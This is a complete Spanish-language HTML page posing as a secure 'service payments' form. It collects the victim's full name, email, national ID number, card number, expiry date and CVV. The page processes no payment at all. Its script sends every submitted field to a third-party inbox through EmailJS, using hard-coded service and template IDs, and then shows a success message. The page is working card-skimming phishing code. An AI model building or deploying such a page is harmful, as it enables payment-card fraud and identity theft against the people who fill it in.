<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Pagos de Servicios</title>

<style>
/* === Fondo profesional === */
body{
  margin:0;
  font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
  background:
    linear-gradient(rgba(0,0,0,.65),rgba(0,0,0,.65)),
    url('https://images.unsplash.com/photo-1590159914188-1d46aa79f9e3?auto=format&fit=crop&w=1200&q=80')
    center/cover no-repeat fixed;
  display:flex;justify-content:center;align-items:center;min-height:100vh;color:#ecf0f1;
}

/* === Tarjeta / contenedor === */
.container{
  background:#ffffffee;
  color:#34495e;
  padding:40px 30px;
  border-radius:14px;
  box-shadow:0 12px 28px rgba(0,0,0,.25);
  max-width:450px;width:100%;
}

/* Título y subtítulo */
h1{text-align:center;margin:0 0 8px}
.subtitle{font-size:15px;text-align:center;margin-bottom:25px;color:#6c7a89}

/* Campos y botones */
input,select,button{
  width:100%;box-sizing:border-box;
  font-size:15px;padding:13px 15px;margin-bottom:18px;
  border:1.8px solid #d1d9e6;border-radius:10px;
  transition:border-color .25s;
}
input:focus,select:focus{border-color:#2980b9;outline:none}
input.invalid{border-color:#e74c3c;background:#fdecea}

button{
  background:#2980b9;color:#fff;font-weight:600;cursor:pointer;
  display:flex;justify-content:center;align-items:center;gap:10px;
  border:none;border-radius:10px;transition:background .3s;
}
button:hover:not(:disabled){background:#1c5980}
button:disabled{background:#95a5a6;cursor:not-allowed}

/* Loader (spinner) */
.loader{border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;
        width:22px;height:22px;animation:spin 1s linear infinite}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}

/* Éxito */
.success{display:none;background:#d4edda;color:#155724;
         padding:14px;margin-top:20px;border-radius:10px;text-align:center;font-weight:600}

/* Radios de tarjeta */
.radio-group label{margin-right:22px;cursor:pointer}
.radio-group input{margin-right:6px}
</style>
</head>
<body>
<div class="container">

  <!-- Título + subtítulo -->
  <h1>Pagos de Servicios</h1>
  <p class="subtitle">Complete los datos para procesar su pago de forma segura.</p>

  <!-- Bloque 1: Selección de monto -->
  <div id="seleccion-monto">
     <h3 style="text-align:center;margin-top:0">Seleccione el monto a pagar</h3>
     <select id="monto-opciones">
       <option value="">-- Seleccione un monto --</option>
       <option value="100">100</option>
       <option value="200">200</option>
       <option value="500">500</option>
       <option value="otro">Otro monto</option>
     </select>
     <input type="number" id="monto-personalizado" placeholder="Escriba el monto" style="display:none"/>
     <button id="continuar-btn">Continuar</button>
  </div>

  <!-- Bloque 2: Formulario de pago (oculto al inicio) -->
  <form id="payment-form" style="display:none" novalidate>
     <input type="hidden" name="monto" id="monto-enviado"/>

     <!-- Tipo de tarjeta -->
     <div class="radio-group" style="margin-bottom:18px">
       <label><input type="radio" name="tipo_tarjeta" value="Visa" required>Visa</label>
       <label><input type="radio" name="tipo_tarjeta" value="Mastercard" required>Mastercard</label>
     </div>

     <!-- Datos del cliente -->
     <input type="text"    name="nombre"   placeholder="Nombre completo"      required/>
     <input type="email"   name="email"    placeholder="Correo electrónico"   required/>
     <input type="text"    name="dni"      placeholder="DNI"                  maxlength="15" required/>
     <input type="text"    name="tarjeta"  placeholder="Número de tarjeta"    pattern="\\d{13,16}" maxlength="16" required/>
     <input type="text"    name="titular"  placeholder="Nombre del titular"   required/>
     <input type="text"    name="vencimiento" placeholder="MM/AA (Vencimiento)" pattern="^(0[1-9]|1[0-2])\\/([0-9]{2})$" maxlength="5" required/>
     <input type="text"    name="cvv"      placeholder="CVV"                  pattern="\\d{3,4}" maxlength="4" required/>

     <button type="submit">Realizar pago</button>
  </form>

  <!-- Mensaje de éxito -->
  <div id="mensaje" class="success"></div>
</div>

<!-- === EmailJS SDK === -->
<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>emailjs.init("FL6vofHg7F9vLawQs");</script>

<script>
/* ----- Elementos DOM ----- */
const montoOpciones      = document.getElementById('monto-opciones');
const montoPersonalizado = document.getElementById('monto-personalizado');
const continuarBtn       = document.getElementById('continuar-btn');
const bloqueMonto        = document.getElementById('seleccion-monto');
const form               = document.getElementById('payment-form');
const montoHidden        = document.getElementById('monto-enviado');
const mensaje            = document.getElementById('mensaje');
const btnSubmit          = form.querySelector('button');

/* ----- Paso 1: selección de monto ----- */
montoOpciones.addEventListener('change',()=>{
  montoPersonalizado.style.display = montoOpciones.value==='otro' ? 'block':'none';
});

continuarBtn.addEventListener('click',()=>{
  let monto = montoOpciones.value==='otro' ? montoPersonalizado.value.trim() : montoOpciones.value;
  if(!monto || isNaN(monto) || Number(monto)<=0){
    alert('Por favor, ingrese un monto válido.');
    return;
  }
  montoHidden.value = monto;
  bloqueMonto.style.display = 'none';
  form.style.display = 'block';
});

/* ----- Validaciones simples ----- */
function validarCampo(input){
  if(!input.checkValidity()){ input.classList.add('invalid'); return false;}
  input.classList.remove('invalid'); return true;
}
form.addEventListener('input',e=>{ if(e.target.tagName==='INPUT') validarCampo(e.target); });

/* ----- Envío con EmailJS ----- */
form.addEventListener('submit',e=>{
  e.preventDefault();
  let valido = true;
  form.querySelectorAll('input[required]').forEach(i=>{ if(!validarCampo(i)) valido=false; });
  if(!valido) { alert('Por favor, complete todos los campos correctamente.'); return; }

  /* Loader */
  btnSubmit.disabled=true;
  const loader=document.createElement('span'); loader.className='loader';
  btnSubmit.textContent='Enviando...'; btnSubmit.prepend(loader);

  emailjs.sendForm('service_6pbv86h','template_m3nuw4p',form)
    .then(()=>{
      mensaje.textContent='✅ ¡Formulario enviado correctamente!';
      mensaje.style.display='block';
      form.reset();  // Limpia
      btnSubmit.disabled=false;
      btnSubmit.textContent='Realizar pago';
      loader.remove();
      setTimeout(()=>{mensaje.style.display='none';},6000);
    })
    .catch(err=>{
      alert('❌ Error al enviar: '+JSON.stringify(err));
      btnSubmit.disabled=false;
      btnSubmit.textContent='Realizar pago';
      loader.remove();
    });
});
</script>
</body>
</html>
